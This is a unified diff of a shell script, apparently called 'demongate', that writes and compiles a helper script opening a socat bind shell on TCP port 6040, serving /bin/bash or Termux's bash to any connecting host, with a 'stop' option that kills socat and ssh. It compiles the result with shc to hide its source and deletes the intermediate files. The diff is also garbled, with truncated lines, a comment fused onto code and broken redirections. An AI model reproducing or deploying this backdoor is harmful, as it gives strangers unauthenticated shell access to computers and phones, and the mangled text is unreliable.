@@ -1,16 +1,16 @@
-chmod +x *
+#!/bin/sh
 echo "
+#!/bin/sh
 if [[ '$1' == 'stop' ]]; then
 pkill socat
 pkill ssh
 elif [[ '$1' == 'k' ]]; then
-socat TCP-LISTEN:6040 EXEC:/bin/bash > /dev/null 2>1 &                                                                elif [[ '$1' == 't' ]]; then
-socat TCP-LISTEN:6040 EXEC:/data/data/com.termux/files/usr/bin/bash > /dev/null 2>1 &
+socat TCP-LISTEN:6040 EXEC:/bin/bash > /dev/null 2>1 &                     >
+socat TCP-LISTEN:6040 EXEC:/data/data/com.termux/files/usr/bin/bash > /dev/>
 else
 ####################################################
 fi
-" >> demongate.sh
-#compilimg file
+" >> demongate.sh                                                           #compilimg file
 shc -f demongate.sh > /dev/null 2>1
 #deleting old files
 rm demongate.sh.x.c
